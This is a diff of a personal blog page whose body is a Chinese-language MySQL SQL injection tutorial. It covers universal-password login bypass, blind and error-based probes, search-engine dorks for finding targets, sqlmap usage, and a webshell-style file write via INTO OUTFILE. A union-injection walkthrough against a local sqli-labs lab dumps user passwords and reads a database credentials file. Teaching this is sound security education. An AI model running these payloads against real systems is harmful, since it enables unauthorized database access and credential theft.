@@ -14,7 +14,11 @@
     <meta name="screen-orientation" content="portrait">
     <link rel="dns-prefetch" href="http://tea9.xyz">
   	<link rel="stylesheet" href="/css/style.css">
-  	<link rel="stylesheet" href="/css/github-gist.css">
+    <link rel="stylesheet" href="/css/github-gist.css">
+    
+      <link rel="stylesheet" href="/css/prettify.css">
+      <link rel="stylesheet" href="/css/highlight/atelier-savanna-light.min.css">
+    
     <!--SEO-->
 
 <meta name="description" content="心中有光の孩子"/>
@@ -143,13 +147,13 @@
 </blockquote>
 <p>– 摘自百度百科  </p>
 <h3 id="mysql注入语句-万能密码"><a href="#mysql注入语句-万能密码" class="headerlink" title="mysql注入语句-万能密码"></a>mysql注入语句-万能密码</h3><pre><code># 登录处正常的SQL语句：
-select * from users where username= &apos;admin&apos; and pwd = &apos;pass&apos;;
+select * from users where username= &#39;admin&#39; and pwd = &#39;pass&#39;;
 
 # 万能密码：
-&apos;or &apos;1&apos; = &apos;1 
+&#39;or &#39;1&#39; = &#39;1 
 
 # 带入用户输入参数
-select * from users where username= &apos;&apos;or &apos;1&apos; = &apos;1&apos; and pwd = &apos;&apos;or &apos;1&apos; = &apos;1&apos;;
+select * from users where username= &#39;&#39;or &#39;1&#39; = &#39;1&#39; and pwd = &#39;&#39;or &#39;1&#39; = &#39;1&#39;;
 
 第一个 or 前面为 false 后面为 true -&gt; true
 and 前面为 true 后面为 false -&gt; false
@@ -158,7 +162,7 @@ and 前面为 true 后面为 false -&gt; false
 and 1=2 union select 1,2,3--
 
 # 利用mysql正则表达式为匹配当前用户是否为ro开头
-select user() regexp &apos;^ro&apos;
+select user() regexp &#39;^ro&#39;
 
 # 查询当前用户的ascii码是否为114（r）
 ascii(substr(substr(select user()),1,1))=114
@@ -173,37 +177,37 @@ if(ascii(substr((select user()),1,1))=114,0,sleep(5))
 updatexml(1,concat(0x7e,(select @@version),0x7e),1)
 </code></pre><h2 id="sql注入流程"><a href="#sql注入流程" class="headerlink" title="sql注入流程"></a>sql注入流程</h2><ol>
 <li><p><strong>目标搜集：</strong><br> 无特定目标：  </p>
-<pre><code>inurl:php?id=
+<pre><code> inurl:php?id=
 </code></pre><p> 有特定目标：  </p>
-<pre><code>inurl:php?id= site:target.com
+<pre><code> inurl:php?id= site:target.com
 </code></pre><p> 工具爬取：  </p>
-<pre><code>spider，对搜索引擎和目标网站的链接进行爬取
+<pre><code> spider，对搜索引擎和目标网站的链接进行爬取
 </code></pre></li>
 <li><p><strong>注入识别：</strong><br> 手工简单识别：  </p>
-<pre><code>&apos;
-and 1=1 / and 1=2
-and &apos;1&apos; =&apos;1 / and &apos;1&apos;=&apos;2
-and 1 like 1 / and 1 like 2
+<pre><code> &#39;
+ and 1=1 / and 1=2
+ and &#39;1&#39; =&#39;1 / and &#39;1&#39;=&#39;2
+ and 1 like 1 / and 1 like 2
 </code></pre><p> 工具识别：  </p>
-<pre><code>sqlmap -m filename (filename中保存检测目标)
-sqlmap --crawl (sqlmap对网站进行爬取，然后依次进行测试)
+<pre><code> sqlmap -m filename (filename中保存检测目标)
+ sqlmap --crawl (sqlmap对网站进行爬取，然后依次进行测试)
 </code></pre></li>
 </ol>
 <ol start="3">
 <li><p><strong>高级识别：</strong>  </p>
 <p> 扩展识别广度和深度：  </p>
-<pre><code>sqlmap --level 增加测试级别，对header中相关参数也进行测试
-sqlmap -r filename(filename中为网站请求数据)
+<pre><code> sqlmap --level 增加测试级别，对header中相关参数也进行测试
+ sqlmap -r filename(filename中为网站请求数据)
 </code></pre><p> 利用工具提高识别效率：  </p>
-<pre><code>BurpSuite + SqlMap
+<pre><code> BurpSuite + SqlMap
 </code></pre><p> Tips:  </p>
-<pre><code>可以在参数后键入 “*” 来确定想要测试的参数  
-可能出现注入的点：新闻、登录、搜索、留言......  
-站在开发的角度去寻找  
+<pre><code> 可以在参数后键入 “*” 来确定想要测试的参数  
+ 可能出现注入的点：新闻、登录、搜索、留言......  
+ 站在开发的角度去寻找  
 </code></pre></li>
 <li><p><strong>代码审计：</strong>  </p>
 <p> 搜索关键代码和函数  </p>
-<pre><code>关键代码包括 $_GET/$_POST/$id/select/SELECT
+<pre><code> 关键代码包括 $_GET/$_POST/$id/select/SELECT
 </code></pre><p> 梳理业务流程  </p>
 </li>
 </ol>
@@ -322,40 +326,40 @@ select 列名 from 库名.表名;
 <p>1.需要知道绝对路径(web下层目录)<br>2.用户需要file权限(root可写)，一般用户不会有file权限<br>3.文件大小小于max_allow_upload<br>4.secure_file_priv 指定可写目录</p>
 </blockquote>
 <p>写</p>
-<pre><code>select &apos;&lt;?php phpinfo();?&gt;&apos; into outfile &apos;c://php//www//kkk.php&apos;;
-select &apos;&lt;?php phpinfo();?&gt;&apos; into dumpfile &apos;c://php//www//kkk2.php&apos;;
-select * from user into outfile &apos;c://php//www/kkk4.php&apos; fields terminated by &apos;&lt;?php phpinfo();?&gt;&apos;
+<pre><code>select &#39;&lt;?php phpinfo();?&gt;&#39; into outfile &#39;c://php//www//kkk.php&#39;;
+select &#39;&lt;?php phpinfo();?&gt;&#39; into dumpfile &#39;c://php//www//kkk2.php&#39;;
+select * from user into outfile &#39;c://php//www/kkk4.php&#39; fields terminated by &#39;&lt;?php phpinfo();?&gt;&#39;
 </code></pre><hr>
 <h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>tips:  </p>
 <blockquote>
 <p>查询数据的时候把信息记录到txt上</p>
 </blockquote>
 <pre><code># 判断是否存在sql注入 
-http://127.0.0.1/Less-1/?id=2&apos; 
-http://127.0.0.1/Less-1/?id=2&apos; and &apos;1&apos;=2
+http://127.0.0.1/Less-1/?id=2&#39; 
+http://127.0.0.1/Less-1/?id=2&#39; and &#39;1&#39;=2
 
 # 判断列数
-http://127.0.0.1/Less-1/?id=2&apos; order by 3--+
+http://127.0.0.1/Less-1/?id=2&#39; order by 3--+
 
 # 判断输出信息位置 (union之前要报错才会查询union后面的)
-http://127.0.0.1/Less-1/?id=99999&apos; union select 1,2,3--+
+http://127.0.0.1/Less-1/?id=99999&#39; union select 1,2,3--+
 
 # 查库名
-http://127.0.0.1/Less-1/?id=&apos; union select 1,2,（select group_concat(schema_name) from information_schema.schemata--+
+http://127.0.0.1/Less-1/?id=&#39; union select 1,2,（select group_concat(schema_name) from information_schema.schemata--+
 
-# 查表名 &apos;security&apos;/十六进制0x/database()
-http://127.0.0.1/Less-1/?id=&apos; union select 1,2,（select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;--+
+# 查表名 &#39;security&#39;/十六进制0x/database()
+http://127.0.0.1/Less-1/?id=&#39; union select 1,2,（select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+
 
 # 查数据 group_concat/concat_ws
-http://127.0.0.1/Less-1/?id=&apos; union select 1,2,（select group_concat(username,0x7e,password) from security.users)--+
+http://127.0.0.1/Less-1/?id=&#39; union select 1,2,（select group_concat(username,0x7e,password) from security.users)--+
 
 # 查权限
-http://127.0.0.1/Less-1/?id=&apos; union select 1,2,(select user())--+ 
+http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select user())--+ 
 
 &gt; root@localhost 
 
 #  读文件 db-creds.inc 数据库配置文件
-http://127.0.0.1/Less-1/?id=&apos; union select 1,2,(select load_file(&apos;/var/www/html/sql-connections/db-creds.inc&apos;))--+ 
+http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select load_file(&#39;/var/www/html/sql-connections/db-creds.inc&#39;))--+ 
 </code></pre><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a href="https://www.mysql.com/" target="_blank" rel="noopener">mysql官网</a><br><a href="https://dev.mysql.com/doc/refman/5.7/en/dynindex-function.html" target="_blank" rel="noopener">mysql内置函数</a><br><a href="http://ascii.911cha.com/" target="_blank" rel="noopener">ascii对照表</a><br><a href="http://www.runoob.com/mysql/mysql-regexp.html" target="_blank" rel="noopener">mysql正则</a><br><a href="https://blog.csdn.net/vspiders/article/details/77430024" target="_blank" rel="noopener">MYSQL updatexml报错注入</a><br><a href="https://blog.csdn.net/i_peter/article/details/53380334" target="_blank" rel="noopener">Python Spider 的总结</a><br><a href="https://blog.csdn.net/hxsstar/article/details/19337461" target="_blank" rel="noopener">MySQL手工注入步骤+直接写入一句话</a><br><a href="https://blog.csdn.net/m2417599488/article/details/72236666" target="_blank" rel="noopener">Mysql通过命令授于用户数据库操作权限</a><br><a href="https://blog.csdn.net/zhaoyangjian724/article/details/52121193" target="_blank" rel="noopener">mysql 函数执行权限</a>  </p>
  
 		</div>
@@ -376,24 +380,34 @@ http://127.0.0.1/Less-1/?id=&apos; union select 1,2,(select load_file(&apos;/var
 
 		<hr />
 <div class="footer">
-	
-        
-            <a href="//github.com/tea9" rel="external nofollow" title="Github" target="_blank">
-		    	<i class="iconfont">&#xeee2;</i>
-		    </a>&nbsp;&nbsp;
-        
-            <a href="/atom.xml" rel="external nofollow" title="RSS" target="_blank">
-		    	<i class="iconfont">&#xe6ee;</i>
-		    </a>&nbsp;&nbsp;
-        
-	
+   
+    
+      <a href="//github.com/tea9" rel="external nofollow" title="Github" target="_blank">
+        <i class="iconfont">&#xeee2;</i> 
+      </a>
+      &nbsp;&nbsp; 
+    
+      <a href="/atom.xml" rel="external nofollow" title="RSS" target="_blank">
+        <i class="iconfont">&#xe6ee;</i> 
+      </a>
+      &nbsp;&nbsp; 
+     
+  
 </div>
 <script src="/js/jquery.min.js"></script>
-<script src="/js/highlight.js"></script>
-<script>hljs.initHighlightingOnLoad();</script>
+ <script src="/js/prettify.js"></script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $("pre").addClass(
+      "prettyprint linenums"
+    );
+    prettyPrint();
+  });
+</script>
+
 
 		<div class="copyright">
-	Copyright &copy; 2019 . 没有备案<br />Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>&nbsp;&nbsp;&sdot;&nbsp;&nbsp;Theme is <a href="https://github.com/praming/hexo-theme-Ice" target="_blank">Ice</a>&nbsp;&nbsp;&sdot;&nbsp;&nbsp;Hosted by <a href="https://pages.coding.me">Coding Pages</a>
+	Copyright &copy; 2019 . <a href="/v1">v1</a> . <a href="/v2">v2</a><br />Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>&nbsp;&nbsp;&sdot;&nbsp;&nbsp;Theme is <a href="https://github.com/praming/hexo-theme-Ice" target="_blank">Ice</a>
 </div>
   <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":200,"height":350},"mobile":{"show":true},"log":false});</script></body>
 </html>
